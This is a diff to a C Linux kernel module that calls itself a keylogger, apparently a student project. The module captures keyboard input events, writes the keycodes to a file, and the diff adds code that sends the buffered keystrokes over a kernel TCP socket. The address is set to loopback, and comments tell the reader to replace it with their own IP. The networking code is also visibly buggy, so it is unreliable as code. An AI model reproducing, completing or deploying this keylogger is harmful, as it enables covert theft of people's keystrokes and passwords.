@@ -5,13 +5,25 @@
 #include <linux/kernel.h>
 #include <linux/net.h>
 #include <linux/uaccess.h>
+#include <linux/in.h>
+#include <linux/seq_file_net.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peter Derias z5311768");
 
+void keylogger_strcat(char *src, char *dst) {
+    int i;
+    for (i = 0; src[i] != '\0'; i++);
+    for (int j = i; dst[j - i] != '\0'; j++) {
+        src[j] = dst[j - i];
+    }
+}
+
 static int __init keylogger_init(void) {
     loff_t zero;
-    char buf[20], pack[6000];
+    char buf[20], pack[800];
+    struct socket *sock;
+    int err;        
     int log, dev, i;
     mm_segment_t old_fs = get_fs();
     struct input_event ev;
@@ -33,7 +45,7 @@ static int __init keylogger_init(void) {
         if (ev.value == 1) {
             printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
             snprintf(buf, 20, "%d\n", ev.code);
-            strcat(pack, buf);
+            keylogger_strcat(pack, buf);
             // find the size needed
             dev = ev.code;
             for (log = 1; dev != 0; log++) {
@@ -41,31 +53,51 @@ static int __init keylogger_init(void) {
             }
             kernel_write(persist, buf, log, &zero);
         }
-        if (i % 300 == 0) {
+        if (i % 40 == 0) {
             // send me your data - well, this will send to 127.0.0.1 as a proof of concept. Change it for your needs.
-            struct socket *sock;
-            int err;
-
-            err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-            if (err < 0) {
-                    printk(KERN_INFO "failed tcp thingo\n");
+            if (i == 40) {
+                err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+                if (err < 0) {
+                        printk(KERN_INFO "failed tcp thingo\n");
+                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        break;
+                }
+                struct sockaddr_in addr = {
+                    .sin_family = AF_INET,
+                    .sin_port = htons (60000),
+                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
+                };
+                err = sock->ops->bind (sock, (struct sockaddr *) &addr, sizeof(addr));
+                if (err < 0) {
+                        printk(KERN_INFO "failed binding to port 12345\n");
+                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        break;
+                }
             }
+
             struct msghdr msg;
-            msg.name = kmalloc(40);
-            snprintf(msg.name, 40, "your data: i = %d\n", i);
-            msg.msg_namelen = sizeof(msg.name);
-            msg.msg_iov = 
-            err = kernel_sendmsg(sock, struct msghdr *msg, struct kvec *vec, size_t num, size_t size);
+            msg.msg_name = kmalloc(40, GFP_KERNEL);
+            snprintf(msg.msg_name, 40, "your data: i = %d\n", i);
+            msg.msg_namelen = sizeof(msg.msg_name);
+            msg.msg_control = NULL;
+            msg.msg_controllen = 0;
+            msg.msg_flags = MSG_TRYHARD;
+
+            struct kvec vec;
+            vec.iov_base = pack;
+            vec.iov_len = sizeof(pack);
+
+            err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
             if (err < 0) {
                     printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
                     break;
             }
+            kfree(msg.msg_name);
         }
         i++;
     }
     set_fs(old_fs);
     return 0;
-    
 }
 static void keylogger_exit(void) {
     printk(KERN_INFO "unloaded successfully");
